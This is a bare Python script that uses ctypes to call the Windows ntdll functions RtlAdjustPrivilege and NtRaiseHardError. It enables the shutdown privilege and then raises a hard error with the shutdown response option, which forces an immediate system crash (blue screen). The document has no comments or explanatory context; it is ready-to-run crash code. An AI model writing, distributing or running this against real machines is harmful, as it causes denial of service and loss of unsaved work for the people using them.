import ctypes

ntdll = ctypes.WinDLL("ntdll.dll")

def RtlAdjustPrivilege(Privilege, bEnablePrivilege, IsThreadPrivilege):
    PreviousValue = ctypes.c_bool()
    ntdll.RtlAdjustPrivilege(Privilege, bEnablePrivilege, IsThreadPrivilege, ctypes.byref(PreviousValue))
    return PreviousValue.value

def NtRaiseHardError(ErrorStatus, NumberOfParameters, UnicodeStringParameterMask, Parameters, ValidResponseOption):
    Response = ctypes.c_uint()
    ntdll.NtRaiseHardError(ErrorStatus, NumberOfParameters, UnicodeStringParameterMask, Parameters, ValidResponseOption, ctypes.byref(Response))
    return Response.value

def main():
    t1 = RtlAdjustPrivilege(19, True, False)
    t2 = NtRaiseHardError(0xc0000022, 0, 0, None, 6)

if __name__ == '__main__':
    main()
